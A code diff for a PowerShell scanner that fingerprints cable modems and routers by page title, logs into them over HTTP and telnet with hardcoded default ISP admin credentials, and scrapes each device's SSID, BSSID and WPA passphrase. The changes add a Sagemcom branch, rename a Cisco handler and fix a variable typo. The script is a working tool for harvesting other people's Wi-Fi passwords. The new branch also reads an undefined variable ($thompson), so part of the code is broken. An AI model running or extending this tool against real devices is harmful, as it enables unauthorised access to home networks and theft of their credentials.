@@ -153,10 +153,16 @@ function motorola($ip){
     verifyFile
 	if([System.IO.File]::Exists($save)){
 		$motorola = Get-Content $save
-		$BSSID = ($motorola -match 'colspan=2 bgcolor=#E7DAAC>.*').split('()')[1].Trim()
-		$SSID = ($motorola -match 'colspan=2 bgcolor=#E7DAAC>.*').split('()')[0].replace('<tr><td align=middle valign=top colspan=2 bgcolor=#E7DAAC>','').Trim()
-		$PASS = (($motorola -match 'size=32 maxlength=64 value=".*"') -split 'value="' -split '"></tr><tr>')[1]
-		"$SSID - $BSSID - $PASS"
+		if($motorola -like '*Sagemcom*'){
+			$BSSID = ($thompson -match '([0-9A-Fa-f]{2}[:]){5}[0-9A-Fa-f]{2}').split('()')[1].ToUpper()
+			$PASS = (($thompson -match ('name="WpaPreSharedKey" size="*32"* maxlength="*64"* value=".*"')) -split 'value="')[1].split('"')[0]
+			"$SSID - $BSSID - $PASS"
+		}else{
+			$BSSID = ($motorola -match 'colspan=2 bgcolor=#E7DAAC>.*').split('()')[1].Trim()
+			$SSID = ($motorola -match 'colspan=2 bgcolor=#E7DAAC>.*').split('()')[0].replace('<tr><td align=middle valign=top colspan=2 bgcolor=#E7DAAC>','').Trim()
+			$PASS = (($motorola -match 'size=32 maxlength=64 value=".*"') -split 'value="' -split '"></tr><tr>')[1]
+			"$BSSID - $PASS"
+		}
 	}
 }
 
@@ -164,16 +170,16 @@ function motorola($ip){
 function motorolasbg($ip){ 
 	Write-Output "=========$ip - Motorola SBG900=========" 
     if((Invoke-WebRequest -Uri "http://$ip/frames.asp" -Method "POST" -Headers @{"Cache-Control"="max-age=0"; "Origin"="$ip"; "Upgrade-Insecure-Requests"="1"; "DNT"="1"; "User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"; "Accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"; "Referer"="http://$ip/index.asp"; "Accept-Encoding"="gzip, deflate"; "Accept-Language"="es-CO,es-AR;q=0.9,es-419;q=0.8,es;q=0.7,fr;q=0.6"} -ContentType "application/x-www-form-urlencoded" -Body "userId=admin&password=Uq-4GIt3M&btnLogin=Log+In").content -match '\d\d\d\d\d'){
-    $sessionID = $Matches[0]
-    curl -o $save --connect-timeout 3 -m 60 -s http://$ip/wireless/wirelessStatus.asp?sessionId=$sessionID -H "Connection: keep-alive" -H "Upgrade-Insecure-Requests: 1" -H "DNT: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" -H "Referer: http://$ip/wireless/tabs.asp?sessionId=29805" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es-CO,es-AR;q=0.9,es-419;q=0.8,es;q=0.7,fr;q=0.6" --compressed --insecure
-    verifyFile
+    	$sessionID = $Matches[0]
+    	curl -o $save --connect-timeout 3 -m 60 -s http://$ip/wireless/wirelessStatus.asp?sessionId=$sessionID -H "Connection: keep-alive" -H "Upgrade-Insecure-Requests: 1" -H "DNT: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" -H "Referer: http://$ip/wireless/tabs.asp?sessionId=29805" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es-CO,es-AR;q=0.9,es-419;q=0.8,es;q=0.7,fr;q=0.6" --compressed --insecure
+    	verifyFile
 	
-	$sbg = Get-Content $save
-	$sbgPass = (curl "http://$ip/wireless/wirelessSecurity.asp?sessionId=23114" -H "Connection: keep-alive" -H "Upgrade-Insecure-Requests: 1" -H "DNT: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" -H "Referer: http://$ip/wireless/tabs.asp?sessionId=23114" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es-CO,es-AR;q=0.9,es-419;q=0.8,es;q=0.7,fr;q=0.6" --compressed --insecure)
-	$PASS = ([Regex]::new('"Wireless.Security.wpaPskPassphrase",\s+".*"').Matches($sbgPass).value -split '",')[1].Trim().replace('"','')
-	$SSID = ([Regex]::new('"Wireless.Status.essid",\s+".*"').Matches($sbg).value -split '",')[1].Trim().replace('"','')
-	$BSSID = ($sbg -match '([0-9A-Fa-f]{2}[:]){5}[0-9A-Fa-f]{2}').split('"')[1]
-	"$SSID - $BSSID - $PASS"
+		$sbg = Get-Content $save
+		$sbgPass = (Invoke-WebRequest -Uri "http://$ip/wireless/wirelessSecurity.asp?sessionId=$sessionID" -Headers @{"Upgrade-Insecure-Requests"="1"; "DNT"="1"; "User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"; "Accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"; "Referer"="http://$ip/wireless/tabs.asp?sessionId=10171"; "Accept-Encoding"="gzip, deflate"; "Accept-Language"="es-CO,es-AR;q=0.9,es-419;q=0.8,es;q=0.7,fr;q=0.6"}).Content
+		$PASS = ([Regex]::new('"Wireless.Security.wpaPskPassphrase",\s+".*"').Matches($sbgPass).value -split '",')[1].Trim().replace('"','')
+		$SSID = ([Regex]::new('"Wireless.Status.essid",\s+".*"').Matches($sbg).value -split '",')[1].Trim().replace('"','')
+		$BSSID = ($sbg -match '([0-9A-Fa-f]{2}[:]){5}[0-9A-Fa-f]{2}').split('"')[1]
+		"$SSID - $BSSID - $PASS"
     }
 }
 
@@ -189,7 +195,7 @@ function unlockCisco($ip){
 
 
 # Cisco DPC2420
-function ciscoAuth($ip){
+function ciscoDPC2420($ip){
 	Write-Output "=========$ip - Cisco DPC2420=========" 
 	unlockCisco $ip;
 	unlockCisco $ip;
@@ -234,7 +240,7 @@ function hitron($ip){
 	Get-Telnet -RemoteHost "$ip" -Commands "admin","Uq-4GIt3M","wpaKeygetnow","cable" ,"system" ,"ipPrint"
 	verifyFile
 	if([System.IO.File]::Exists($save)){
-		$$hitron = Get-Content $save
+		$hitron = Get-Content $save
 		$BSSID = ($hitron -match 'ra0       Link encap:Ethernet  HWaddr .*' -split 'HWaddr ')[1]
 		$PASS = ($hitron -match 'wpa key is:.*' -split ': ')[1]
 		"$BSSID - $PASS"
@@ -271,8 +277,8 @@ function runScanner(){
 				".*<title>WAN</title>.*" {wan $line; break}
 				".*<title>Residential Gateway Login</title>.*" {motorola $line; break}
 				".*<title>Motorola SBG900</title>.*"  {motorolasbg $line; break}
-				".*<TITLE>Cisco Cable Modem</TITLE>.*" {ciscoAuth $line; break}
-				".*<title>Cisco Cable Modem</title>.*"  {ciscoAuth $line; break}
+				".*<TITLE>Cisco Cable Modem</TITLE>.*" {ciscoDPC2420 $line; break}
+				".*<title>Cisco Cable Modem</title>.*"  {ciscoDPC2420 $line; break}
 				".*<title>Common UI</title>.*" {techCGA0101 $line; break}
 				".*vt_docsystem.*" {techDPC3928SL2 $line; break}
 				".*CGNV2.*" {hitron $line; break}
